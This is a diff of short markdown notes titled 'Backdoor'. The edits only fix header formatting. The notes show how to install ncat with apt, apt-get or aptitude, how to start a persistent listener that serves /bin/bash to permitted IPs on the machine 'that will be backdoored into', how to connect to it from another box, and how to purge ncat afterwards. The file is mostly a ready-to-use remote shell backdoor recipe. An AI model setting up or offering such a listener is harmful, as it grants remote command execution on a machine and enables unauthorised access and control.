@@ -1,25 +1,25 @@
-#Backdoor 
-##Install ncat on the locat box
-###Apt-get (Install)
+# Backdoor 
+## Install ncat on the locat box
+### Apt-get (Install)
 'sudo apt-get update'
 'sudo apt-get -y install ncat'
 
-###Apt (Install)
+### Apt (Install)
 'sudo apt update'
 'sudo apt -y install ncat'
 
-###Aptitude (Install)
+### Aptitude (Install)
 'sudo aptitude update'
 'sudo aptitude -y install ncat'
 
-##Local box that will be backdoored into 
+## Local box that will be backdoored into 
 'ncat -k -nvlp <port> -e "/bin/bash" --allow <ip's go here>
 
-##Box that will backdoor into local machine 
+## Box that will backdoor into local machine 
 'ncat -nv <ip address of local box> <port> 
 
 
 
-###If ncat needs to be deleated
+### If ncat needs to be deleated
 'sudo apt-get -y autoremove --purge ncat'
 
